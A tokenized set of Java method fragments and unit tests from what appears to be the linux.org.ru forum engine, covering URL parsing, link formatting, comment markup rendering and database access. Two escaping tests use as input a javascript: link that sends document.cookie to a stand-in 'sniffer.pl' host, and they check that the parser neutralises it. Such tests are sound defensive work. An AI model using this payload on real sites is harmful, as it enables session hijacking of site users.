public String formatJump ( TopicDao messageDao , boolean secure ) throws MessageNotFoundException , URIException { if ( _topic_id ! = - 1 ) { Topic message = messageDao . getById ( _topic_id ) ; Group group = null ; try { group = messageDao . getGroup ( message ) ; } catch ( BadGroupException e ) { throw new RuntimeException ( " Invalid group id msgid= " + _topic_id , e ) ; } String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = getHost ( ) ; int port = getPort ( ) ; String path = group . getUrl ( ) + _topic_id ; String query = " " ; if ( _comment_id ! = - 1 ) { query = " cid= " + _comment_id ; } URI jumpUri = new URI ( scheme , null , host , port , path , query ) ; return jumpUri . getEscapedURI ( ) ; } return " " ; } 
public static boolean isUnsignedPositiveNumber ( String s ) { return s . matches ( " \\ d+ " ) ; } 
private RootNode prepareTopicRootNode ( boolean minimizeCut , String cutURL , boolean secure ) { RootNode rootNode = defaultParser . getRootNode ( ) ; if ( minimizeCut ) { try { LorURL lorCutURL = new LorURL ( configuration . getMainURI ( ) , cutURL ) ; if ( lorCutURL . isTrueLorUrl ( ) ) { URI fixURI = new URI ( lorCutURL . fixScheme ( secure ) , true , " UTF-8 " ) ; rootNode . setMinimizedTopicCutOptions ( fixURI ) ; } else { rootNode . setMaximizedTopicCutOptions ( ) ; } } catch ( Exception e ) { rootNode . setMaximizedTopicCutOptions ( ) ; } } else { rootNode . setMaximizedTopicCutOptions ( ) ; } rootNode . setUserDao ( userDao ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( toHtmlFormatter ) ; return rootNode ; } 
private void processMessageUrl ( boolean secure , StringBuilder out , LorURL url ) throws URIException { try { Topic message = messageDao . getById ( url . getMessageId ( ) ) ; 
public void test1 ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url1 ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486#comment-6753612 " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486#comment-6753612 " , lorURI . fixScheme ( true ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test1n ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url1n ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . fixScheme ( true ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test2 ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url2 ) ; assertEquals ( 6893165 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/talks/6893165?lastmod=1319027964738 " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/talks/6893165?lastmod=1319027964738 " , lorURI . fixScheme ( true ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/talks/6893165 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/talks/6893165 " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test3 ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url3 ) ; assertEquals ( 6890857 , lorURI . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " , lorURI . fixScheme ( true ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test4 ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url4 ) ; assertEquals ( - 1 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test5 ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url5 ) ; assertEquals ( - 1 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( ! lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test6 ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url6 ) ; assertEquals ( - 1 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , true ) ) ; assertEquals ( " http:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( true ) ) ; } 
public void test7 ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url7 ) ; assertEquals ( - 1 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , true ) ) ; assertEquals ( " http:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( true ) ) ; } 
public void test8 ( ) throws Exception { boolean result = false ; try { LorURL lorURI = new LorURL ( mainURI , failurl8 ) ; } catch ( URIException e ) { result = true ; } assertTrue ( result ) ; } 
public void test9 ( ) throws Exception { boolean result = false ; try { LorURL lorURI = new LorURL ( mainURI , failurl9 ) ; } catch ( URIException e ) { result = true ; } assertTrue ( result ) ; } 
public void test10 ( ) throws Exception { boolean result = false ; try { LorURL lorURI = new LorURL ( mainURI , failurl10 ) ; } catch ( Exception e ) { result = true ; } assertTrue ( result ) ; } 
public void test11 ( ) throws Exception { boolean result = false ; try { LorURL lorURI = new LorURL ( mainURI , failurl11 ) ; } catch ( Exception e ) { result = true ; } assertTrue ( result ) ; } 
public void test12 ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url12 ) ; assertEquals ( 1948661 , lorURI . getMessageId ( ) ) ; assertEquals ( 1948668 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/security/1948661?cid=1948668 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/security/1948661?cid=1948668 " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test13 ( ) throws Exception { String url13_1 = " http:www.linux.org.ru/view-news.jsp?tag=c%2B%2B " ; String url13_2 = " http:www.linux.org.ru/view-news.jsp?tag=c++ " ; String url13_3 = " http:www.linux.org.ru/view-news.jsp?tag=c+c " ; LorURL lorURI1 = new LorURL ( mainLORURI , url13_1 ) ; LorURL lorURI2 = new LorURL ( mainLORURI , url13_2 ) ; LorURL lorURI3 = new LorURL ( mainLORURI , url13_3 ) ; assertEquals ( " https:www.linux.org.ru/view-news.jsp?tag=c++ " , lorURI1 . fixScheme ( true ) ) ; assertEquals ( " http:www.linux.org.ru/view-news.jsp?tag=c++ " , lorURI1 . fixScheme ( false ) ) ; assertEquals ( " https:www.linux.org.ru/view-news.jsp?tag=c%20%20 " , lorURI2 . fixScheme ( true ) ) ; assertEquals ( " http:www.linux.org.ru/view-news.jsp?tag=c%20%20 " , lorURI2 . fixScheme ( false ) ) ; assertEquals ( " http:www.linux.org.ru/view-news.jsp?tag=c%20c " , lorURI3 . fixScheme ( false ) ) ; assertEquals ( " https:www.linux.org.ru/view-news.jsp?tag=c%20c " , lorURI3 . fixScheme ( true ) ) ; } 
public void test14 ( ) throws Exception { String url14_1 = " https:www.linux.org.ru/jump-message.jsp?msgid=6890857&amp;cid=6892917 " ; String url14_2 = " https:127.0.0.1:8080/jump-message.jsp?msgid=6890857&amp;cid=6892917 " ; LorURL lorURI1 = new LorURL ( mainLORURI , url14_1 ) ; LorURL lorURI2 = new LorURL ( mainURI , url14_2 ) ; assertEquals ( 6890857 , lorURI1 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI1 . getCommentId ( ) ) ; assertTrue ( lorURI1 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI1 . isMessageUrl ( ) ) ; assertTrue ( lorURI1 . isCommentUrl ( ) ) ; assertEquals ( " http:www.linux.org.ru/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI1 . fixScheme ( false ) ) ; assertEquals ( " https:www.linux.org.ru/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI1 . fixScheme ( true ) ) ; assertEquals ( " http:www.linux.org.ru/forum/general/6890857?cid=6892917 " , lorURI1 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:www.linux.org.ru/forum/general/6890857?cid=6892917 " , lorURI1 . formatJump ( messageDao , true ) ) ; assertEquals ( 6890857 , lorURI2 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI2 . getCommentId ( ) ) ; assertTrue ( lorURI2 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI2 . isMessageUrl ( ) ) ; assertTrue ( lorURI2 . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI2 . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI2 . fixScheme ( true ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI2 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI2 . formatJump ( messageDao , true ) ) ; } 
public void test15 ( ) throws Exception { String url15_1 = " https:www.linux.org.ru/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " ; String url15_2 = " https:127.0.0.1:8080/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " ; LorURL lorURI1 = new LorURL ( mainLORURI , url15_1 ) ; LorURL lorURI2 = new LorURL ( mainURI , url15_2 ) ; assertEquals ( 6944260 , lorURI1 . getMessageId ( ) ) ; assertEquals ( 6944831 , lorURI1 . getCommentId ( ) ) ; assertTrue ( lorURI1 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI1 . isMessageUrl ( ) ) ; assertTrue ( lorURI1 . isCommentUrl ( ) ) ; assertEquals ( " http:www.linux.org.ru/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI1 . fixScheme ( false ) ) ; assertEquals ( " https:www.linux.org.ru/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI1 . fixScheme ( true ) ) ; assertEquals ( " http:www.linux.org.ru/forum/linux-org-ru/6944260?cid=6944831 " , lorURI1 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:www.linux.org.ru/forum/linux-org-ru/6944260?cid=6944831 " , lorURI1 . formatJump ( messageDao , true ) ) ; assertEquals ( 6944260 , lorURI2 . getMessageId ( ) ) ; assertEquals ( 6944831 , lorURI2 . getCommentId ( ) ) ; assertTrue ( lorURI2 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI2 . isMessageUrl ( ) ) ; assertTrue ( lorURI2 . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI2 . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI2 . fixScheme ( true ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/linux-org-ru/6944260?cid=6944831 " , lorURI2 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/linux-org-ru/6944260?cid=6944831 " , lorURI2 . formatJump ( messageDao , true ) ) ; } 
public void testToHtmlFormatter ( ) { assertEquals ( RESULT1 , toHtmlFormatter . format ( TEXT1 , false ) ) ; assertEquals ( RESULT2 , toHtmlFormatter . format ( TEXT2 , false ) ) ; assertEquals ( RESULT3 , toHtmlFormatter20 . format ( TEXT3 , false ) ) ; assertEquals ( RESULT8 , toHtmlFormatter20 . format ( TEXT8 , false ) ) ; assertEquals ( RESULT9 , toHtmlFormatter . format ( TEXT9 , false ) ) ; assertEquals ( RESULT10 , toHtmlFormatter . format ( TEXT10 , false ) ) ; assertEquals ( RESULT11 , toHtmlFormatter . format ( TEXT11 , false ) ) ; assertEquals ( RESULT12 , toHtmlFormatter . format ( TEXT12 , false ) ) ; assertEquals ( RESULT13 , toHtmlFormatter . format ( TEXT13 , false ) ) ; assertEquals ( RESULT14 , toHtmlFormatter . format ( TEXT14 , false ) ) ; assertEquals ( RESULT15 , toHtmlFormatter . format ( TEXT15 , false ) ) ; assertEquals ( RESULT16 , toHtmlFormatter . format ( TEXT16 , false ) ) ; assertEquals ( RESULT17 , toHtmlFormatter . format ( TEXT17 , false ) ) ; assertEquals ( RESULT17_2 , toHtmlFormatter . format ( TEXT17_2 , false ) ) ; assertEquals ( RESULT18 , toHtmlFormatter . format ( TEXT18 , false ) ) ; assertTrue ( toHtmlFormatter . format ( LINK_WITH_UNDERSCORE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( LINK_WITH_PARAM_ONLY , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( RFC1738 , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( CYR_LINK , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( GOOGLE_CACHE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( URL_WITH_AT , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( Latin1Supplement , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( greek , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( QP , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( EMPTY_ANCHOR , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( SLASH_AFTER_AMP , false ) . endsWith ( " </a> " ) ) ; } 
public ModelAndView handleUserBanedException ( UserBanedException ex , HttpServletRequest request , HttpServletResponse response ) { return new ModelAndView ( " error-user-banned " , " exception " , ex ) ; } 
public void urlEscapeTest ( ) { Assert . assertEquals ( " <p><s title= \" javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close() \" >Test</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " , false ) ) ; Assert . assertEquals ( " <p><s>javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s></p> " , lorCodeService . parseComment ( " [url]javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()[/url] " , false ) ) ; 
public void urlEscapeWithTagsTest ( ) { Assert . assertEquals ( " <p><s title= \" javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close() \" >T<i>e</i>st</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]T[i]e[/i]st[/url] " , false ) ) ; 
public void urlParameterQuotesTest ( ) { assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url= \" http:www.example.com]example[/url] " , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url= \" http:www.example.com \" ]example[/url] " , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url='http:www.example.com']example[/url] " , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url='http:www.example.com]example[/url] " , false ) ) ; 
public String prepareCommentText ( int id , final boolean secure ) { MessageText messageText = msgbaseDao . getMessageText ( id ) ; if ( messageText . isLorcode ( ) ) { return lorCodeService . parseComment ( messageText . getText ( ) , secure ) ; 
public String prepareCommentTextRSS ( int id , final boolean secure ) { MessageText messageText = msgbaseDao . getMessageText ( id ) ; if ( messageText . isLorcode ( ) ) { return lorCodeService . parseCommentRSS ( messageText . getText ( ) , secure ) ; 
public MessageText mapRow ( ResultSet resultSet , int i ) throws SQLException { String text = resultSet . getString ( " message " ) ; boolean lorcode = resultSet . getBoolean ( " bbcode " ) ; return new MessageText ( text , lorcode ) ; } 
private void updateMessage ( Topic topic ) throws IOException , SolrServerException { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , topic . getId ( ) ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , topic . getMessageId ( ) ) ; doc . addField ( " group_id " , topic . getGroupId ( ) ) ; doc . addField ( " title " , StringEscapeUtils . unescapeHtml ( topic . getTitle ( ) ) ) ; doc . addField ( " topic_title " , topic . getTitle ( ) ) ; doc . addField ( " message " , msgbaseDao . getMessageText ( topic . getId ( ) ) . getText ( ) ) ; Date postdate = topic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; solrServer . add ( doc ) ; } 
public String prepareCommentTextRSS ( int id , final boolean secure ) { MessageText messageText = msgbaseDao . getMessageText ( id ) ; return lorCodeService . prepareTextRSS ( messageText . getText ( ) , secure , messageText . isLorcode ( ) ) ; } 
public void updateMessage ( int msgid , String text ) { namedJdbcTemplate . update ( " UPDATE msgbase SET message=:message WHERE id=:msgid " , 
public static EditInfoDto createFromMessage ( TagDao tagDao , Topic message , String text ) { EditInfoDto current = new EditInfoDto ( ) ; current . setOldmessage ( text ) ; current . setEditdate ( message . getPostdate ( ) ) ; current . setEditor ( message . getUid ( ) ) ; current . setMsgid ( message . getMessageId ( ) ) ; current . setOldtags ( TagDao . toString ( tagDao . getMessageTags ( message . getMessageId ( ) ) ) ) ; current . setOldlinktext ( message . getLinktext ( ) ) ; current . setOldurl ( message . getUrl ( ) ) ; return current ; } 
public PreparedTopic prepareTopicForView ( Topic message , boolean minimizeCut , boolean secure , User user ) { return prepareMessage ( message , messageDao . getTags ( message ) , minimizeCut , null , secure , user , null ) ; } 
public PreparedTopic prepareMessage ( Topic message , boolean minimizeCut , boolean secure ) { return prepareMessage ( message , messageDao . getTags ( message ) , minimizeCut , null , secure , null ) ; } 
public PreparedTopic prepareMessage ( Topic message , List < String > tags , PreparedPoll newPoll , boolean secure , String text ) { return prepareMessage ( message , tags , false , newPoll , secure , text ) ; } 
private PreparedTopic prepareMessage ( Topic message , List < String > tags , boolean minimizeCut , PreparedPoll poll , boolean secure , String text ) { return prepareMessage ( message , tags , minimizeCut , poll , secure , null , text ) ; } 
private PreparedTopic prepareMessage ( Topic message , List < String > tags , boolean minimizeCut , PreparedPoll poll , boolean secure , User user , String text ) { try { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user ) { List < PersonalizedPreparedTopic > pm = new ArrayList < PersonalizedPreparedTopic > ( messages . size ( ) ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , true , null , secure , null ) ; TopicMenu topicMenu = getMessageMenu ( preparedMessage , user ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , topicMenu ) ) ; } return pm ; } 
public List < PreparedTopic > prepareMessages ( List < Topic > messages , boolean secure ) { List < PreparedTopic > pm = new ArrayList < PreparedTopic > ( messages . size ( ) ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , true , null , secure , null ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public void appendMessage ( int msgid , String text ) { jdbcTemplate . update ( " UPDATE msgbase SET message=message||? WHERE id=? " , 
public void escapeDoubleBrackets ( ) { assertEquals ( " <p>[[doNotTag]]</p> " , lorCodeService . parseComment ( " [[doNotTag]] " , true ) ) ; assertEquals ( " <p>[[/doNotTag]]</p> " , lorCodeService . parseComment ( " [[/doNotTag]] " , true ) ) ; assertEquals ( " <p>[b]</p> " , lorCodeService . parseComment ( " [[b]] " , true ) ) ; assertEquals ( " <p>[/b]</p> " , lorCodeService . parseComment ( " [[/b]] " , true ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[doNotTag]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[doNotTag]][/code] " , true ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[/doNotTag]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[/doNotTag]][/code] " , true ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[b]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[b]][/code] " , true ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[/b]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[/b]][/code] " , true ) ) ; assertEquals ( " <p>[[[doNotTag]]]</p> " , lorCodeService . parseComment ( " [[[doNotTag]]] " , true ) ) ; assertEquals ( " <p>[[[/doNotTag]]]</p> " , lorCodeService . parseComment ( " [[[/doNotTag]]] " , true ) ) ; assertEquals ( " <p>[[b]]</p> " , lorCodeService . parseComment ( " [[[b]]] " , true ) ) ; assertEquals ( " <p>[[/b]]</p> " , lorCodeService . parseComment ( " [[[/b]]] " , true ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[b]]</code></pre></div><p>[b]</p> " , lorCodeService . parseComment ( " [code][[b]][/code][[b]] " , true ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[/b]]</code></pre></div><p>[b]</p> " , lorCodeService . parseComment ( " [code][[/b]][/code][[b]] " , true ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[code]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[code]][/code] " , true ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[/code]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[/code]][/code] " , true ) ) ; 
private PreparedImage prepareImage ( Topic topic ) { String mediumName = Screenshot . getMediumName ( topic . getUrl ( ) ) ; String htmlPath = configuration . getHTMLPathPrefix ( ) ; if ( ! new File ( htmlPath , mediumName ) . exists ( ) ) { mediumName = topic . getLinktext ( ) ; } try { ImageInfo mediumImageInfo = new ImageInfo ( htmlPath + mediumName ) ; 
public ModelAndView handleUserNotFound ( Exception ex , HttpServletRequest request , HttpServletResponse response ) { return new ModelAndView ( " error-user-not-found " , " exception " , ex ) ; } 
public ModelAndView undeleteForm ( HttpServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Topic message = messageDao . getById ( msgid ) ; checkUndeletable ( message ) ; ModelAndView mv = new ModelAndView ( " undelete " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " preparedMessage " , prepareService . prepareTopic ( message , false , request . isSecure ( ) , tmpl . getCurrentUser ( ) ) ) ; return mv ; } 
public ModelAndView uncommitForm ( HttpServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Topic message = messageDao . getById ( msgid ) ; checkUncommitable ( message ) ; ModelAndView mv = new ModelAndView ( " uncommit " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " preparedMessage " , prepareService . prepareTopic ( message , false , request . isSecure ( ) , tmpl . getCurrentUser ( ) ) ) ; return mv ; } 
public PreparedTopic prepareTopic ( Topic message , boolean minimizeCut , boolean secure , User user ) { return prepareMessage ( message , messageDao . getTags ( message ) , minimizeCut , null , secure , user , null ) ; } 
public PreparedTopic prepareTopicPreview ( Topic message , List < String > tags , PreparedPoll newPoll , boolean secure , String text ) { return prepareMessage ( message , tags , false , newPoll , secure , text ) ; } 
public PreparedTopic prepareTopicPreview ( Topic message , List < String > tags , PreparedPoll newPoll , boolean secure , String text ) { return prepareMessage ( message , tags , false , newPoll , secure , text ) ; } 
private boolean doDeleteComment ( int msgid , String reason , User user , int scoreBonus ) { int deleteCount = jdbcTemplate . update ( deleteComment , msgid ) ; if ( deleteCount > 0 ) { deleteInfoDao . insert ( msgid , user , reason , scoreBonus ) ; 
public DeleteInfo mapRow ( ResultSet resultSet , int i ) throws SQLException { Integer bonus = resultSet . getInt ( " bonus " ) ; if ( resultSet . wasNull ( ) ) { bonus = null ; } return new DeleteInfo ( resultSet . getString ( " nick " ) , 
public void insert ( int msgid , User deleter , String reason , int scoreBonus ) { jdbcTemplate . update ( INSERT_DELETE_INFO , msgid , deleter . getId ( ) , reason , scoreBonus ) ; } 
public DeleteInfoStat mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new DeleteInfoStat ( rs . getString ( " reason " ) , rs . getInt ( " count " ) , rs . getInt ( " sum " ) ) ; } 
public VoteDto mapRow ( ResultSet rs , int rowNum ) throws SQLException { VoteDto dto = new VoteDto ( ) ; dto . setId ( rs . getInt ( " id " ) ) ; dto . setLabel ( rs . getString ( " label " ) ) ; return dto ; } 
public synchronized void add ( Object name , Object value ) throws UnsupportedEncodingException { if ( value = = null ) { return ; } if ( ! query . trim ( ) . equals ( " " ) ) query + = " & " ; query + = URLEncoder . encode ( name . toString ( ) , " UTF-8 " ) + " = " + URLEncoder . encode ( value . toString ( ) , " UTF-8 " ) ; 
